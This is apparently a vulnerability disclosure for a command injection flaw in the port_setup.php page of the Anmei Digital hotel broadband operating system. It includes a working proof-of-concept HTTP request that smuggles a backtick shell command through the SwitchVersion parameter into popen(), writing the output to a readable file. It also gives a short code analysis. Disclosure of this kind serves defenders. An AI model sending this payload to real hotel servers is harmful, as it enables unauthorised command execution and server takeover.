## Affected version: 
Anmei Digital hotel broadband operating system has a command execution vulnerability

## Official website:
http://www.amttgroup.com/


## Vulnerability File:
/manager/network/port_setup.php

## Description:
Amie century (Beijing) technology co., LTD. (http://www.amttgroup.com/) is a digital service solution provider for star hotel operating services and digital content.
Anmei Digital hotel broadband operating system has a command execution vulnerability. An attacker could exploit this vulnerability to gain access to the server.

Status: CRITICAL

## Vulnerability recurrence

The login page is shown in the following figure
![image](https://github.com/user-attachments/assets/5f2286c2-e3c7-4c31-8807-2dd02dbba54b)

POC
The command output is not displayed when the popen command is executed. The command is written to 1.txt using $SwitchVersion
```
GET /manager/network/port_setup.php?SwitchIP=1&SwitchPort=90&SwitchIndex=1&SwitchVersion=`whoami%3E1.txt` HTTP/1.1
Host: 127.0.0.1:6070
Cookie: PHPSESSID=1pcd0lbnkcss5m3hk5rcm4kcp2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 192.168.1.23
Priority: u=1
Te: trailers
Connection: close
```
![image](https://github.com/user-attachments/assets/e91b8b89-b659-4313-92c6-1605a457dd61)

Access the file /manager/network/1.txt to see the results of whiami's execution
![image](https://github.com/user-attachments/assets/a20bc189-a5b6-484d-b899-81730bb9f1c8)

## code analysis:

There is no filter in port_setup.php because the $SwitchVersion parameter is controllable, and this parameter is directly brought into the popen() function, causing command execution vulnerabilities.
![image](https://github.com/user-attachments/assets/f4ff4ef5-f2fc-4260-8fae-5a68ca7086c2)



